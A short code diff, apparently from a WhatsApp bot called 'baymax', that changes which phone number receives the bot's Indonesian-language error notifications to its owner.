-baymax.sendMessage("6287705048235@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
+baymax.sendMessage("6281390368580@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
 contextInfo:{
 forwardingScore: 5, 
 isForwarded: true
